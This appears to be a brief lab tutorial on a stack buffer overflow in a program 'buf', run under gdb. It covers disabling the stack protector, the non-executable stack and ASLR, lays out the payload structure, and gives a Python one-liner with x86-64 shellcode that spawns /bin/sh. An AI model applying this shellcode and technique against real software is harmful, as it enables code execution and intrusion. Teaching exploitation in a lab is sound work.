

This approach of bufferOverflow uses gdb <br/>

You will need to compile it using the following compiler directives. You will notice that some security measures are turned off <br/>
- gcc -fno-stack-protector -z execstack buf.c -o buf <br/>
Next, you will need to remove another security precaution called ASLR. Execute the following command: <br/>
- sudo nano /proc/sys/kernel/randomize_va_space  <br/>

Run the obtained object file 'buf' passing a string input, say 'Hello' <br/>
./buf Hello <br/>

debug the execution using gdb debugger <br/>
- gdb -q buf <br/>

payload for the overflow:=  <br/>
'A'*76 + shellcode + // the 100 byte buffer  <br/>
'A'*12 + // the12 byte alignment part  <br/>
'B'*8 + // the 8 byte rbp <br/>
Return_address. // the 6 byte return address (rip) <br/>

We don't know the return address yet so we will just run it with any return address and when the program crashes we will <br/>
just examine memory and calculate the return address. How do we do that? Run the following from within gdb.

-Runnig the below command under gdb terminal should give access to shell on a linux distro <br/>
$(python -c "print 'A'*76+ <br/>
'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+ <br/>
'A'*12+'B'*8+'C'*6")
